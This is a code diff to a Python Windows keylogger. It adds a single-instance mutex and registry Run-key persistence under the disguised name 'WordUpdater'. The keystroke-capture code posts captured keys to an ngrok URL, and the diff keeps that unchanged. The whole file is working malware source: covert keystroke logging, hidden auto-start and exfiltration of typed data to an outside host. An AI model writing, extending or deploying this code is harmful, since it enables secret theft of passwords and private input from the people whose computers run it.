@@ -1,10 +1,36 @@
 import ctypes
 import time
 import requests
+import sys
+import os
+import winreg
+import win32event
+import win32api
+import winerror
 
-ngrok_url = 'https://miserably-probable-starfish.ngrok-free.app'
+# === Prevent multiple instances using a named mutex ===
+mutex = win32event.CreateMutex(None, False, "Global\\WordUpdaterMutex")
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    sys.exit(0)  # Exit if already running
 
+# === Auto-start at Windows login using registry ===
+def add_to_startup():
+    exe_path = sys.executable
+    key = winreg.HKEY_CURRENT_USER
+    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    name = "WordUpdater"
+    try:
+        registry_key = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
+    except FileNotFoundError:
+        registry_key = winreg.CreateKey(key, reg_path)
+    winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, exe_path)
+    winreg.CloseKey(registry_key)
+
+add_to_startup()
+
+# === Keylogging functionality ===
 user32 = ctypes.windll.user32
+ngrok_url = 'https://miserably-probable-starfish.ngrok-free.app'
 
 def getKey(code):
     asciiTable = {
@@ -43,9 +69,8 @@ def main():
                 try:
                     joined_keys = ''.join(buffer)
                     requests.post(ngrok_url, data={'message': joined_keys})
-                    # print(f"Sent: {joined_keys}")
                     buffer.clear()
-                except Exception as e:
+                except Exception:
                     pass
             last_sent = time.time()
 
